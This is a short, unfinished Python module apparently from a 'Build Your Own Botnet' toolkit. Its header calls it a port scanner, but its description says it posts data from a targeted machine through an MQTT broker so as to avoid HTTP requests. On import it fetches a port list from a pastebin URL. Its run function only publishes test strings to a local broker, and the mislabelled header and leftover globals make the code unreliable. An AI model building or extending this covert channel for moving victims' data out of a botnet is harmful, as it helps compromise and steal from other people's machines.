    #!/usr/bin/python
# -*- coding: utf-8 -*-
'Port Scanner (Build Your Own Botnet)'

# standard libarary
import os
import sys
import json
# import Queue
import socket
import paho.mqtt.client as mqtt
import paho.mqtt.publish as publish

if sys.version_info[0] > 2:
    from urllib.request import urlopen
else:
    from urllib import urlopen
import subprocess

# utilities
import util

# globals
packages = []
platforms = ['win32','linux2','darwin']
results = {}
threads = {}
targets = []
ports = json.loads(urlopen('https://pastebin.com/raw/WxK7eUSd').read())
# tasks = Queue.Queue()
usage = 'mqtt [host]:[port]'
desciription = """
Post Data from targeted machine via MQTT broker, rather than HTTP Request
"""



def run(host='test.mosquitto.org'):
    broker_address="localhost"
    client = mqtt.Client("P1") #create new client instance
    client.connect(broker_address)
    client.publish("pat/testTopic", "This is a test")
    publish.single("pat/testTopic", "This is another single test", hostname="localhost")